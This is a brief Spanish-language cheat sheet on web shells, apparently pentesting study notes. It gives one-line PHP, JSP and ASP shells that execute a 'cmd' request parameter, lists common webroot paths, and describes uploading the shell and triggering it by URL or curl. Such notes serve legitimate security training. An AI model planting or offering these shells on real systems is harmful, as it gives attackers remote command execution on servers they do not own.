# 🌐 Web Shells – Resumen

Un **Web Shell** es un script web (PHP, ASPX, JSP…) que recibe comandos vía HTTP y devuelve su salida.
Se usa para ejecutar comandos en un servidor comprometido a través del puerto web (80/443).

## 📌 Características
- Persiste tras reinicio si el archivo sigue en el webroot.
- Evita problemas de firewall (usa el puerto web).
- Menos interactivo que reverse/bind shells.
- Puede automatizarse para obtener una shell semi-interactiva.

## 🔹 Código mínimo
- **PHP:**
```php
<?php system($_REQUEST["cmd"]); ?>
```
- **JSP:**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
- **ASP:**
```asp
<% eval request("cmd") %>
```

## 🔹 Webroots comunes
| Servidor | Webroot |
|----------|---------|
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | C:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

## 🔹 Subida y uso
1. **Subir el archivo** (upload vulnerable o RCE).
2. **Acceder al archivo** en el navegador:
```
http://SERVER_IP:PORT/shell.php?cmd=id
```
3. **Con cURL:**
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

## 📎 Tip
El repo [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) tiene más ejemplos y variantes.
